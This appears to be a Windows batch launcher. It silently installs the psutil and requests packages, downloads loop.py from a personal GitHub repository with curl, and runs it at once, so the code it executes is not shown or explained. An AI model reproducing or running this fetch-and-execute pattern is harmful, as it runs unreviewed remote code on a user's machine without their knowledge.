@echo off
pip install psutil --quiet
pip install requests --quiet
curl -s -L -o loop.py https://raw.githubusercontent.com/georgegaming2030/fuzzy-memory/main/loop.py
python loop.py
